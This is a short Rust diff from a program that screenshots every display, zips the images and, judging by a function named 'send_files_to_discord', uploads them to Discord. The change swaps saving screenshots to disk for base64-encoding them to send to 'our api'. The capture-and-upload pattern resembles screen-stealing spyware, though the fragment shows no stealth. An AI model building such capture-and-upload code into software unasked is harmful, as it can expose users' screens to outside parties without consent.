@@ -46,15 +46,17 @@ fn send_files_to_discord(image: &str, zip_file: &str) {
 fn add_to_zip_file(
     zip: &mut zip::ZipWriter<std::fs::File>, file_name: &str, file_content: &Vec<u8>
 ) {
+
     // Add a file to the zip file
     match zip.start_file(file_name, zip::write::FileOptions::default()) {
         Ok(f) => f,
         Err(e) => panic!("Error: {}", e)
     };
 
+
     // Write the file to the zip file
     std::io::Write::write_all(zip, file_content)
-        .expect("failed to write to zip file")
+        .expect("failed to write to zip file");
 }
 
 // Take a screenshot and save it to the current folder
@@ -73,10 +75,8 @@ fn take_screenshot(zip: &mut zip::ZipWriter<std::fs::File>) {
             zip, &format!("{}-{}.png", image_name, s.display_info.id), &image_buffer
         );
 
-        // Create the image
-        std::fs::write(
-            format!("target/{}.png", s.display_info.id), &image_buffer
-        ).expect("failed to write image");
+        // Send this in the request body to our api
+        let image_to_send_in_api : String = format!("data:image/png;base64,{}", base64::encode(image_buffer).to_string());
     });
 }
 
